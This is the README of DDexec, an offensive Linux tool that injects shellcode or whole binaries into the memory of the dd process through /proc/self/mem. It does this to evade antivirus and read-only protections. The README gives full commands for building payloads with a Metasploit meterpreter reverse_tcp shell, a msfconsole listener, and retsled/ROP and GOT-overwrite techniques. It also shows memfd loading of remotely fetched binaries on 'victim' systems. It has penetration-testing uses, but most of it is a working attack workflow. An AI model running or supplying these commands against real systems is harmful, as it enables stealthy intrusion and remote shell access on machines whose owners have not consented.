# DDexec

This tool allows you to **load shellcodes and binaries in memory** abusing the dd binary (installed everywhere) from a regular sh/bash shell.

This technique can very useful for **stealth purposes** but also to **bypass Read Only protections** in systems that might has applied that protection to make harder to pentesters to run binaries they want inside the system (because they cannot write them).

*Note that in Read Only systems you usually might write inside /dev/shm, but that folder might be protected with noexec like in:*
```bash
echo 'apiVersion: v1
kind: Pod
metadata:
  name: alpine-ro
  namespace: default
spec:
  containers:
  - name: alpine
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", "sleep 100000"]
    securityContext:
      readOnlyRootFilesystem: True' | kubectl apply -f-

```

## Installation
```bash
sudo apt-get update
sudo apt-get install readelf objdump -y
sudo pip3 install ROPGadget
```

## Execution
First of all you need to to **download some files from the victim system**:
- **Dowload the `dd` binary**. Find it with `command -v dd`. This is required.
- **Download the libc library**. Find it with `ldd $(command -v dd) | grep libc | cut -d' ' -f3`. *This is required with mode "retsled"*.
- **Get the Libc base address from the target executing: `printf "0x";(linux64 -R setarch $ARCH -R cat /proc/self/maps || setarch `arch` -R cat /proc/self/maps) | grep libc | head -n1 | cut -d'-' -f1`**

*Note that in the **STDOUT is only going to be printed the commands to execute in the victim machine**. Banner, information and logs are printed in STDERR.*

Then execute `DDexec.sh` with the command line you need to run in the victim system.
```bash
bash DDexec.sh -o ./ddexec_payload.sh -l /tmp/victim/libc.so.6 -d /tmp/victim/dd -a x86_64 -H 127.0.0.1 -P 4444 -p linux/x64/meterpreter/reverse_tcp 
```
**Now you can either upload the resulting sh code to execute in the victim, or copy-paste it in the reverse-shell of the victim.**

*To run a binary you need to use the argument `-b`. Please, read the **Binary Load** section to learn how*

## Help
```
Use this program to execute shellcodes and binaries in memory.
Arguments:
    -h Print this help
    -o Path to the output file with the final payload to execute in the victim.
    -d Path to the victim dd binary (you should download it from the victim). Find it with 'command -v dd' Required.
    -l Path to the victim libc (you should download it from the victim). Find it with 'ldd `command -v dd` | grep libc | cut -d' ' -f3'. Required with mode "retsled".
    -H LHOST to receive the meterpreter
    -P LPORT to receive the meterpreter.
    -p Metasploit payload (by default linux/x64/meterpreter/reverse_tcp)
    -a Architecture of the victim system. Get it with 'uname -m'. Required.
    -m Mode of memory load. By default fclose_got if dd binary not protected with full relro, if protected, retsled is forced.
    -s Shellcode to execute in hex "4831c0b002...". If msfvenom params are given, msfvenom will create a shellcode. By default a shellcode that echoes "Pwnd!" is used.
    -b Binary to load in memory. It has to be either statically linked or use the same dynamic libs as on a target machine.

e.g.: DDexec.sh -o /path/to/output/payload.sh -d /path/to/dd [-l /path/to/libc] -P 4444 -H 10.10.10.10 -a x86_64 [-m <fclose_got,retsled> (default fclose_got)] [-s <shellcode_hex>]
```

## Explanation
DDexec is a technique to **load arbitrary shellcodes and binaries in memory from a shell** in a linux system without needing to write anything into disk.

This can help you **avoid AVs and protections** (*like a filesystem mounted as Read Only*).

Basically, this program will prepare a cmd line that will make **`dd` overwrite itself during execution in memory and execute a defined shellcode or a different binary.**

Therefore, what the prepared cmd line is going to do is to use **`dd` to write a shellcode its own memory (via */proc/self/mem*) and then get control the RIP of the dd process to execute the shellcode**.

In order to control the RIP **2 techniques** are implemented in `DDexec.sh`:

### Retsled
**This technique was defined and developed by [Arget](https://github.com/arget13) a good friend of mine and a really awesome guy in binary exploitation.**

This technique uses a **retsled to overwrite an important part of the stack of the proccess with the goal of overwritting a RIP address** inside the stack with a series of RET. At the end of the retsled a ROP chain is located, so once the RIP is controled by a RET instruction of the retsled the execution will arrive to the ROP chain.

This ROP chain will read the shellcode usnig the `read()` function from `libc` and write it in `0x0000555555554000`.

*This technique generates a **bigger cmd line** than then next technique, maily because of the retsled, but **works with any `dd`**. It's the default technique used by DDexec when the dd binary is protected with full relro.*

#### Retsled Address
In order to control the RIP the retsled needs to **overwrite the return RIP address saved in the stack by any other function**. In order to do that, the retsled DDexec uses is overwritting a page from the address `0x7fffffffe000`. This is because, testing different DD binaries it was found that, with ASLR disabled, the **return of the write function** called by DD is saved in there and **that function doesn't have a stack canary**.

You can check that doing:
```bash
gdb dd
> set exec-wrapper env -i
> b *wrire
> run if=/dev/random of=/dev/null bs=5555 seek=55555555555555 conv=notrunc oflag=seek_bytes count=1
> i r $rsp
rsp            0x7fffffffeb88
# Check that address of $rsp is inside the offset overwritten
```

#### Example
```bash
# Prepare ddexec payload to attack localhost
## To attack a different host you need to DOWNLOAD its DD and LIBC BINARIES
bash DDexec.sh -o /tmp/ddexec_payload.sh -d $(command -v dd) -l $(ldd `command -v dd` | grep libc | cut -d" " -f3) -b $(printf "0x";(linux64 -R cat /proc/self/maps || setarch `arch` -R cat /proc/self/maps) | grep -E "libc|ld-musl" | head -n1 | cut -d'-' -f1) -H 127.0.0.1 -P 4444 -p linux/x64/meterpreter/reverse_tcp -m retsled

# Listen with msfconsole
msfconsole -q -x 'use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; set LPORT 4444; run'

# Execute dd exec payload, you should get a meterpreter shell
bash /tmp/ddexec_payload.sh
```

### fclose GOT
Based on the technique described in https://blog.sektor7.net/#!res/2018/pure-in-memory-linux.md this technique **writes the shellcode in the GOT** of the last function executed by `dd` before exiting: **`fclose`**. Therefore, when **`fclose` is executed, the shellcode will be executed instead**.

*This technique **won't work if the `dd` binary is protected with full relro** because then the GOT table isn't writable*


*Both techniques are possible because the **ASLR is disabled** when executing `dd` using `setarch`.*

#### Example
```bash
# Prepare ddexec payload to attack localhost
## To attack a different host you need to DOWNLOAD its DD and LIBC BINARIES
bash DDexec.sh -o /tmp/ddexec_payload.sh -d $(command -v dd) -l $(ldd `command -v dd` | grep libc | cut -d" " -f3) -b $(printf "0x";(linux64 -R cat /proc/self/maps || setarch `arch` -R cat /proc/self/maps) | grep -E "libc|ld-musl" | head -n1 | cut -d'-' -f1) -H 127.0.0.1 -P 4444 -p linux/x64/meterpreter/reverse_tcp

# Listen with msfconsole
msfconsole -q -x 'use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 127.0.0.1; set LPORT 4444; run'

# Execute dd exec payload, you should get a meterpreter shell
bash /tmp/ddexec_payload.sh
```

### Binary load via memfd
This technique was taken from **https://blog.sektor7.net/#!res/2018/pure-in-memory-linux.mdaslr and modified**.

In order to **load a binary inside dd and execute it** the following steps are performed:
- Use a shellcode which will create a memfd file in a memory. This is done using the system call *memfd_create()* which creates an anonymous file and returns a file descriptor that refers to it. The file **behaves like a regular file. However, it lives in RAM** and is automatically released when all references to it are dropped.
- Inject the shellcode into a `dd` process (using one of the 2 previous techniques).
- Read the binary from stdin and write it to the memfd created by the shellcode.
- 'suspend' the dd process (also done by the shellcode).
- Access `cd /proc/$(pidof dd)/fd; ls` and execute the memfd file containing the binary (e.g.: `./5`)

To perform this steps with `DDexec.sh` you need to **indicate with the `-b` argument the path to the binary** you want to load in memory:
```bash
bash DDexec.sh -o /tmp/ddexec_payload.sh -l /tmp/victim/libc.so.6 -d /tmp/victim/dd -a x86_64 -b <BaseAddress> -B /path/to/bin
```
Then, **upload and execute the ddexec payload generated**.
This will generate a new `dd` process which will have created and **exposed a memfd file** and suspended its execution (so the dd process doesn't die).
You can see the new memf file exposed running:
```bash
ls -l /proc/$(pidof dd)/fd/
total 0
lr-x------    1 root     root            64 Feb 25 12:37 0 -> pipe:[111631]
l-wx------    1 root     root            64 Feb 25 12:37 1 -> /proc/73/mem
lr-x------    1 root     root            64 Feb 25 12:37 10 -> pipe:[111631]
lrwx------    1 root     root            64 Feb 25 12:37 11 -> /dev/pts/2
lrwx------    1 root     root            64 Feb 25 12:37 2 -> /dev/pts/2
lr-x------    1 root     root            64 Feb 25 12:37 3 -> pipe:[111631]
lrwx------    1 root     root            64 Feb 25 12:37 4 -> /dev/pts/2
lrwx------    1 root     root            64 Feb 25 12:37 5 -> /memfd:DEAD (deleted)
```
Notice how one of the file descriptors is **`memfd` aparently "deleted"**. Note that the fd is `5` (in this example).

To execute the loaded binary just do: `/proc/$(pidof dd)/fd/5`

If you want to reuse this memfd to **load another binary**, you just need to **write it in that file**. 

For example, to load the `kubectl` binary you can do: 
```bash
wget "https://dl.k8s.io/release/v1.23.4/bin/linux/amd64/kubectl" -O /proc/$(pidof dd)/fd/5
/proc/$(pidof dd)/fd/5 # This will execute kubectl
```

### Full Binary Load

Instead of using memfd files you could **completelly load the binary inside the DD proc memory**. You can find this completely awesome technique in **https://github.com/arget13/DDexec**